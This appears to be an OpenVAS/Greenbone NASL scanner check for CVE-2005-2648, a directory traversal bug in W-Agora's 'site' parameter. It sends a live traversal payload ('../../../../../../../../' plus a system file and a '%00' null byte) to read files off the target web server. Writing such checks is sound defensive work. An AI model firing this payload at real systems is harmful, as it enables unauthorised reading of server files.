CPE = "cpe:/a:w-agora:w-agora";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.19474" );
	script_version( "2021-06-28T11:30:33+0000" );
	script_tag( name: "last_modification", value: "2021-06-28 11:30:33 +0000 (Mon, 28 Jun 2021)" );
	script_tag( name: "creation_date", value: "2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)" );
	script_cve_id( "CVE-2005-2648" );
	script_bugtraq_id( 14597 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "W-Agora 'site' Parameter Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2005 David Maciejak" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_w-agora_cms_http_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "w-agora/http/detected" );
	script_tag( name: "summary", value: "W-Agora is prone to directory traversal attacks." );
	script_tag( name: "impact", value: "An attacker could send specially crafted URL to read arbitrary
  files on the remote system with the privileges of the web server process." );
	script_tag( name: "solution", value: "Upgrade to the newest version of this software." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	url = dir + "/index.php?site=../../../../../../../../" + file + "%00";
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

